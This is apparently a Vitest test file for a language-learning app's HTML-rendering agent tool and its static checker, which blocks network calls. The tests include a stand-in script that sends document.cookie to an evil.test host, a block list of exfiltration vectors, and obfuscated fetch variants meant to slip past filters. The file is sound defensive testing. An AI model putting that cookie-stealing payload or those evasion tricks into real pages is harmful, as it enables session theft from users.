import { runTool } from '@cuelingo/agent';
import { AgentCardSchema, MAX_HTML_BLOCK_BYTES } from '@cuelingo/shared';
import { describe, expect, it } from 'vitest';
import { checkHtml } from './check';
import { htmlUiPlugin } from './index';

const tool = htmlUiPlugin.tools[0]!;
const ctx = { capabilities: {}, signal: new AbortController().signal };
const run = (input: unknown) => runTool(tool, input, ctx);

const PAGE =
  '<button id="b">Nghe</button><script>document.getElementById("b").onclick=()=>cuelingo.speak("hi")</script>';

describe('html-ui plugin: render_html', () => {
  it('declares only the html permission and the html_block card kind', () => {
    expect(htmlUiPlugin.id).toBe('html-ui');
    expect(htmlUiPlugin.permissions).toEqual(['html']);
    expect(htmlUiPlugin.cardKinds).toEqual(['html_block']);
    expect(htmlUiPlugin.tools.map((t) => t.name)).toEqual(['render_html']);
  });

  it('turns a clean page into an html_block card the shared schema accepts', async () => {
    const result = await run({ html: PAGE, title: 'Luyện nghe' });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.card).toEqual({ kind: 'html_block', data: { title: 'Luyện nghe', html: PAGE } });
    expect(AgentCardSchema.safeParse(result.card).success).toBe(true);
    expect(result.summary).toBe('Đã tạo khối giao diện');
  });

  it('does not echo the page back to the model: it reads only the verdict', async () => {
    const result = await run({ html: PAGE, title: 'Luyện nghe' });
    expect(result.ok && JSON.parse(result.content)).toEqual({
      rendered: true,
      title: 'Luyện nghe',
    });
    expect(result.content).not.toContain('button');
    const refused = await run({ html: '<script>fetch("x")</script>' });
    const body = JSON.parse(refused.content) as Record<string, unknown>;
    expect(body.rendered).toBe(false);
    expect(Object.keys(body).sort()).toEqual(['problem', 'rendered']);
  });

  it('leaves the title out when there is none', async () => {
    const result = await run({ html: PAGE });
    expect(result.ok && result.card).toEqual({ kind: 'html_block', data: { html: PAGE } });
  });

  it('tells the model what to fix instead of showing a block (static check)', async () => {
    const result = await run({
      html: '<script>fetch("https://evil.test/?c="+document.cookie)</script>',
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.card).toBeUndefined();
    expect(result.summary).toBe('Chưa tạo được khối giao diện');
    expect(result.output).toMatchObject({ rendered: false });
    expect((result.output as { problem: string }).problem).toContain('fetch');
  });

  it('refuses a page over 64 KB and says so', async () => {
    const result = await run({ html: 'a'.repeat(MAX_HTML_BLOCK_BYTES + 1) });
    expect(result.ok && result.card).toBeFalsy();
    expect(result.ok && (result.output as { problem: string }).problem).toContain('limit');
  });

  it('rejects empty input before running', async () => {
    const result = await run({ html: '' });
    expect(result.ok).toBe(false);
  });
});

describe('checkHtml (secondary layer, the sandbox is the boundary)', () => {
  const rejected = [
    'fetch("/x")',
    'new XMLHttpRequest()',
    'new WebSocket("wss://x")',
    'new EventSource("/s")',
    'new RTCPeerConnection()',
    'navigator.sendBeacon("/x")',
    'importScripts("a.js")',
    'import("https://x.test/a.js")',
    'import ("a.js")',
    '<style>@import url(a.css)</style>',
    '<base href="https://x.test/">',
    '<meta http-equiv="refresh" content="0;url=https://x.test">',
    '<iframe src="about:blank"></iframe>',
    '<object data="x"></object>',
    '<embed src="x">',
    '<img src="https://x.test/p.png">',
    "<img src='//x.test/p.png'>",
    '<div style="background:url(https://x.test/a.png)"></div>',
    '<IFRAME></IFRAME>',
    '<link rel="dns-prefetch" href="//x.test">',
    '<link rel=preconnect href="https://x.test">',
    '<link rel="prefetch" href="x">',
    '<link rel=prerender href="x">',
    '<link rel="modulepreload" href="a.js">',
    'l.rel = "pre" + "connect"; l.rel = "preconnect"',
    'new webkitRTCPeerConnection()',
    'new RTCDataChannel()',
    // The cheapest obfuscations are undone before checking (best effort, see check.ts).
    'window["fe"+"tch"]("x")',
    "window['fe'+'tch']('x')",
    'window[`fe`+`tch`]("x")',
    'fe/**/tch("x")',
  ];
  for (const snippet of rejected) {
    it(`rejects ${snippet}`, () => {
      expect(checkHtml(snippet).ok).toBe(false);
    });
  }

  it('accepts inline code, data: images and ordinary words', () => {
    expect(checkHtml('<img src="data:image/png;base64,AAAA"><p>Fetching coffee</p>').ok).toBe(true);
    expect(checkHtml(PAGE).ok).toBe(true);
  });

  it('counts bytes, not characters', () => {
    expect(checkHtml('ạ'.repeat(30_000)).ok).toBe(false);
    expect(checkHtml('a'.repeat(MAX_HTML_BLOCK_BYTES)).ok).toBe(true);
  });
});
